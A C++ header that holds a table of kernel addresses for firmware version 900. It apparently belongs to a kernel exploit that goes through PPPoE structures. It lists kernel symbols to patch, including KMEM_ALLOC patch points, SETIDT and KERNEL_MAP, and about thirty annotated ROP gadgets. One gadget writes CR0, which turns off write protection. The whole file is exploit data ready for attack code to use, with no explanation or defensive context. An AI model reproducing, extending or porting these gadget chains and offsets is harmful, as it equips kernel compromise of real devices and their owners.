#pragma once

#include <cstdint>

enum FirmwareVersion {
    FIRMWARE_900 = 900,
};

class OffsetsFirmware {
public:
    uint64_t PPPOE_SOFTC_LIST;
    uint64_t KERNEL_MAP;
    uint64_t SETIDT;
    uint64_t KMEM_ALLOC;
    uint64_t KMEM_ALLOC_PATCH1;
    uint64_t KMEM_ALLOC_PATCH2;
    uint64_t MEMCPY;
    uint64_t MOV_CR0_RSI_UD2_MOV_EAX_1_RET;
    uint64_t SECOND_GADGET_OFF;
    uint64_t FIRST_GADGET;
    uint64_t PUSH_RBP_JMP_QWORD_PTR_RSI;
    uint64_t POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10;
    uint64_t LEA_RSP_RSI_20_REPZ_RET;
    uint64_t ADD_RSP_28_POP_RBP_RET;
    uint64_t ADD_RSP_B0_POP_RBP_RET;
    uint64_t RET;
    uint64_t POP_RDI_RET;
    uint64_t POP_RSI_RET;
    uint64_t POP_RDX_RET;
    uint64_t POP_RCX_RET;
    uint64_t POP_R8_POP_RBP_RET;
    uint64_t POP_R12_RET;
    uint64_t POP_RAX_RET;
    uint64_t POP_RBP_RET;
    uint64_t  PUSH_RSP_POP_RSI_RET;
    uint64_t MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX;
    uint64_t MOV_BYTE_PTR_RCX_AL_RET;
    uint64_t MOV_RDI_RBX_CALL_R12;
    uint64_t MOV_RDI_R14_CALL_R12;
    uint64_t MOV_RSI_RBX_CALL_RAX;
    uint64_t MOV_R14_RAX_CALL_R8;
    uint64_t ADD_RDI_RCX_RET;
    uint64_t SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET;
    uint64_t JMP_R14;

};

class OffsetsFirmware_900: public OffsetsFirmware {
public:
    OffsetsFirmware_900() {
        PPPOE_SOFTC_LIST = 0xffffffff843ed9f8;

        KERNEL_MAP = 0xffffffff84468d48;

        SETIDT = 0xffffffff82512c40;

        KMEM_ALLOC = 0xffffffff8257be70;
        KMEM_ALLOC_PATCH1 = 0xffffffff8257bf3c;
        KMEM_ALLOC_PATCH2 = 0xffffffff8257bf44;

        MEMCPY = 0xffffffff824714b0;

        // 0xffffffff823fb949 : mov cr0, rsi ; ud2 ; mov eax, 1 ; ret
        MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff823fb949;

        SECOND_GADGET_OFF = 0x3d;

        // 0xffffffff82996603 : jmp qword ptr [rsi + 0x3d]
        FIRST_GADGET = 0xffffffff82996603;

        // 0xffffffff82c76646 : push rbp ; jmp qword ptr [rsi]
        PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c76646;

        // 0xffffffff822b4151 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
        POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff822b4151;

        // 0xffffffff82941e46 : lea rsp, [rsi + 0x20] ; repz ret
        LEA_RSP_RSI_20_REPZ_RET = 0xffffffff82941e46;

        // 0xffffffff826c52aa : add rsp, 0x28 ; pop rbp ; ret
        ADD_RSP_28_POP_RBP_RET = 0xffffffff826c52aa;

        // 0xffffffff8251b08f : add rsp, 0xb0 ; pop rbp ; ret
        ADD_RSP_B0_POP_RBP_RET = 0xffffffff8251b08f;

        // 0xffffffff822008e0 : ret
        RET = 0xffffffff822008e0;

        // 0xffffffff822391a8 : pop rdi ; ret
        POP_RDI_RET = 0xffffffff822391a8;

        // 0xffffffff822aad39 : pop rsi ; ret
        POP_RSI_RET = 0xffffffff822aad39;

        // 0xffffffff82322eba : pop rdx ; ret
        POP_RDX_RET = 0xffffffff82322eba;

        // 0xffffffff822445e7 : pop rcx ; ret
        POP_RCX_RET = 0xffffffff822445e7;

        // 0xffffffff822ab4dd : pop r8 ; pop rbp ; ret
        POP_R8_POP_RBP_RET = 0xffffffff822ab4dd;

        // 0xffffffff8279fa0f : pop r12 ; ret
        POP_R12_RET = 0xffffffff8279fa0f;

        // 0xffffffff82234ec8 : pop rax ; ret
        POP_RAX_RET = 0xffffffff82234ec8;

        // 0xffffffff822008df : pop rbp ; ret
        POP_RBP_RET = 0xffffffff822008df;

        // 0xffffffff82bb687a : push rsp ; pop rsi ; ret
        PUSH_RSP_POP_RSI_RET = 0xffffffff82bb687a;

        // 0xffffffff82244ed0 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
        MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff82244ed0;

        // 0xffffffff82b7450e : mov byte ptr [rcx], al ; ret
        MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff82b7450e;

        // 0xffffffff82632b9c : mov rdi, rbx ; call r12
        MOV_RDI_RBX_CALL_R12 = 0xffffffff82632b9c;

        // 0xffffffff8235b387 : mov rdi, r14 ; call r12
        MOV_RDI_R14_CALL_R12 = 0xffffffff8235b387;

        // 0xffffffff822e3d7e : mov rsi, rbx ; call rax
        MOV_RSI_RBX_CALL_RAX = 0xffffffff822e3d7e;

        // 0xffffffff82363918 : mov r14, rax ; call r8
        MOV_R14_RAX_CALL_R8 = 0xffffffff82363918;

        // 0xffffffff82cb683a : add rdi, rcx ; ret
        ADD_RDI_RCX_RET = 0xffffffff82cb683a;

        // 0xffffffff82409557 : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
        SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff82409557;

        // 0xffffffff82b85693 : jmp r14
        JMP_R14 = 0xffffffff82b85693;
    }
};